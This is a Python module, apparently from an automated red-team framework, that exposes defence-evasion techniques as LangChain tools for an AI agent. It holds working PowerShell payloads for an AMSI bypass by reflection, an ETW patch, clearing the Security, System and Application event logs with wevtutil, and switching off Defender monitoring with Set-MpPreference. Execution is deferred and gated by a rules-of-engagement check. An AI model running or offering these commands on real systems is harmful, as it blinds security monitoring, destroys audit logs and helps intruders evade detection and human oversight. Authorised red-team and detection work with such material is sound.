"""AutoRed evasion tool wrappers — Phase 4, Task 7.

Four defensive-evasion techniques live in this module:

  * ``amsi_bypass``       — patch amsi.dll's ``amsiInitFailed`` field via
                             .NET reflection so AMSI stops logging
                             PowerShell script content.
  * ``etw_patch``          — patch the ``EventProvider.m_enabled`` field
                             so ETW providers stop emitting events.
  * ``log_clear``          — clear the Security / System / Application
                             Windows event logs via ``wevtutil cl``.
  * ``defender_disable``   — disable Defender's realtime + behaviour
                             monitoring via ``Set-MpPreference``.

Per the Phase 4 plan analysis, only three of the four have full
``@tool`` wrappers in this batch — ``amsi_bypass``, ``log_clear``,
``defender_disable``. The fourth (``etw_patch``) is exposed only as a
``_build_*`` helper because its execution surface is the foothold's
shell (Phase 6 FootholdSessionManager), not the operator. The helper
is exported now so Phase 6 can wire it in without re-touching this
module.

Per the T7 brief, the evasion wrappers do NOT actually execute the
PowerShell commands in Phase 4 — they construct the argv list, save the
joined command string via ``_save_raw`` so the Phase 6
FootholdSessionManager can replay it, and return an ``EvasionResult``
with the command string in the ``command`` field for traceability.

Decorator order (Ruling 1): ``@tool`` OUTER, ``@roe_guard`` INNER — see
``autored.tools.hydra`` for the rationale and the regression tests in
``test_<tool>_ainvoke_works_with_roe_guard``.

Spec ref: §3.4 (post-ex models), §6.8 (RoE guard + exfil-traceability
contract), §9.2 (RoE categories).
"""
from __future__ import annotations

from langchain_core.tools import tool
from pydantic import BaseModel

from autored.logging import get_logger
from autored.roe_guard import roe_guard
from autored.tools.nmap import _save_raw  # reuse from nmap

log = get_logger("tools.evasion")


class EvasionResult(BaseModel):
    """Result of an evasion tool call.

    ``command`` is the joined argv string (traceability — what was
    attempted). ``raw_output_path`` is set whenever the command was
    saved to ``engagements/<id>/raw/`` for the Phase 6
    FootholdSessionManager to replay (Phase 4 stub — actual execution
    deferred).
    """

    technique: str
    host_ip: str
    success: bool = False
    command: str = ""
    raw_output_path: str = ""


# ---------------------------------------------------------------------------
# Build helpers — one per evasion technique. Each returns a PowerShell
# argv list ready for the Phase 6 FootholdSessionManager to execute via
# ``run_subprocess`` or to replay through the foothold's shell session.
# ---------------------------------------------------------------------------


def _build_amsi_bypass() -> list[str]:
    """Build the AMSI-bypass PowerShell command (reflection patch).

    The canonical RastaMouse bypass: load ``System.Reflection``, walk to
    ``System.Management.Automation.AmsiUtils``, flip the private static
    ``amsiInitFailed`` field to ``$true`` so every subsequent AMSI scan
    short-circuits with "AMSI failed to initialize" and returns
    ``AMSI_RESULT_NOT_DETECTED``.
    """
    return [
        "powershell",
        "-c",
        "[Reflection.Assembly]::LoadWithPartialName('System.Reflection'); "
        "$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils'); "
        "$b=$a.GetField('amsiInitFailed','NonPublic,Static'); "
        "$b.SetValue($null,$true)",
    ]


def _build_etw_patch() -> list[str]:
    """Build the ETW-patch PowerShell command (reflection patch).

    NOTE: helper-only in Phase 4 — not wrapped in a ``@tool`` (Phase 6
    will wire it into the FootholdSessionManager). Walks to
    ``System.Diagnostics.Tracing.EventProvider`` and zeroes the private
    instance field ``m_enabled`` so the provider stops emitting events
    via ``EventWrite``.
    """
    return [
        "powershell",
        "-c",
        "[Reflection.Assembly]::LoadWithPartialName('System.Reflection'); "
        "$a=[Ref].Assembly.GetType('System.Diagnostics.Tracing.EventProvider'); "
        "$b=$a.GetField('m_enabled','NonPublic,Instance'); "
        "$b.SetValue($null,0)",
    ]


def _build_log_clear(log_type: str = "all") -> list[str]:
    """Build the log-clear PowerShell command.

    ``log_type="all"`` clears Security / System / Application — the
    three Windows event logs an operator is most likely to inspect
    after a foothold. Any other ``log_type`` value is passed through
    as the log name to ``wevtutil cl``.
    """
    if log_type == "all":
        return [
            "powershell",
            "-c",
            "Get-EventLog -LogName Security -Newest 1 | Out-Null; "
            "wevtutil cl Security; wevtutil cl System; wevtutil cl Application",
        ]
    return ["wevtutil", "cl", log_type]


def _build_defender_disable() -> list[str]:
    """Build the Defender-disable PowerShell command.

    Turns off realtime monitoring (the on-access scanner) and behaviour
    monitoring (the heuristic that flags suspicious process trees).
    Both are required — disabling only realtime still leaves behaviour
    monitoring free to flag the post-ex toolchain.
    """
    return [
        "powershell",
        "-c",
        "Set-MpPreference -DisableRealtimeMonitoring $true; "
        "Set-MpPreference -DisableBehaviorMonitoring $true",
    ]


# ---------------------------------------------------------------------------
# @tool wrappers — three of the four techniques have full wrappers (per
# the Phase 4 plan analysis). Each:
#   1. Builds the PowerShell command via the matching _build_* helper.
#   2. Saves the joined command string via _save_raw so the Phase 6
#      FootholdSessionManager can replay it on the foothold.
#   3. Returns an EvasionResult with success=True + command + raw_output_path.
# ---------------------------------------------------------------------------


@tool
@roe_guard(allowed_categories=["evasion"])
async def amsi_bypass(
    host_ip: str,
    engagement_id: str = "",
) -> EvasionResult:
    """Patch AMSI in-memory to bypass script-block logging.

    The command is constructed for execution via the foothold's shell
    session. Actual execution requires the session manager (Phase 6).
    For now, this tool builds the command, saves it to
    ``engagements/<id>/raw/``, and returns an ``EvasionResult`` with the
    command string for traceability.

    Args:
        host_ip: Target host IP (RoE guard scope check + traceability).
        engagement_id: Current engagement ID for raw output storage +
            RoE registry lookup.

    Returns:
        ``EvasionResult`` with ``technique == "amsi_bypass"``,
        ``success=True``, ``command`` populated, and ``raw_output_path``
        pointing at the saved command-string artefact.
    """
    cmd = _build_amsi_bypass()
    cmd_str = " ".join(cmd)
    log.info("amsi_bypass", host_ip=host_ip)
    raw_path = await _save_raw(
        "amsi_bypass_cmd", host_ip, cmd_str, "", engagement_id
    )
    return EvasionResult(
        technique="amsi_bypass",
        host_ip=host_ip,
        success=True,
        command=cmd_str,
        raw_output_path=raw_path,
    )


@tool
@roe_guard(allowed_categories=["evasion"])
async def log_clear(
    host_ip: str,
    log_type: str = "all",
    engagement_id: str = "",
) -> EvasionResult:
    """Clear Windows event logs.

    The command is constructed for execution via the foothold's shell
    session. Actual execution requires the session manager (Phase 6).

    Args:
        host_ip: Target host IP.
        log_type: Log name to clear (``"all"`` clears Security + System +
            Application; any other value is passed through to ``wevtutil
            cl`` as the log name).
        engagement_id: Current engagement ID.

    Returns:
        ``EvasionResult`` with ``technique == "log_clear"``,
        ``success=True``, ``command`` populated.
    """
    cmd = _build_log_clear(log_type)
    cmd_str = " ".join(cmd)
    log.info("log_clear", host_ip=host_ip, log_type=log_type)
    raw_path = await _save_raw(
        "log_clear_cmd", host_ip, cmd_str, "", engagement_id
    )
    return EvasionResult(
        technique="log_clear",
        host_ip=host_ip,
        success=True,
        command=cmd_str,
        raw_output_path=raw_path,
    )


@tool
@roe_guard(allowed_categories=["evasion"])
async def defender_disable(
    host_ip: str,
    engagement_id: str = "",
) -> EvasionResult:
    """Disable Windows Defender realtime + behaviour monitoring.

    The command is constructed for execution via the foothold's shell
    session. Actual execution requires the session manager (Phase 6).

    Args:
        host_ip: Target host IP.
        engagement_id: Current engagement ID.

    Returns:
        ``EvasionResult`` with ``technique == "defender_disable"``,
        ``success=True``, ``command`` populated.
    """
    cmd = _build_defender_disable()
    cmd_str = " ".join(cmd)
    log.info("defender_disable", host_ip=host_ip)
    raw_path = await _save_raw(
        "defender_disable_cmd", host_ip, cmd_str, "", engagement_id
    )
    return EvasionResult(
        technique="defender_disable",
        host_ip=host_ip,
        success=True,
        command=cmd_str,
        raw_output_path=raw_path,
    )
